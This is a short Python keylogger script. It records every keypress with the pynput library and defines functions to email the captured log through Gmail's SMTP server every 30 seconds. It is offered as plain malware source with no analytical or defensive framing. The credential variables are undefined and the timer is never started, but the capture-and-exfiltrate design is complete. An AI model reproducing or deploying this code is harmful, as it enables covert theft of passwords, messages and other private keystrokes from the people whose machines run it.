import pynput.keyboard
import smtplib
import threading

log = ""


def callback_func(key):
    global log
    try:
        log = log + str(key)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log += str(key)
    print(log)

def send_email(email, password, log):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,log)
    email_server.quit()
keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)

def threading_func():
    global log
    send_email(email, password,log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30, threading_func)
    timer_object.start()

#threading
with keylogger_listener:
    keylogger_listener.join()
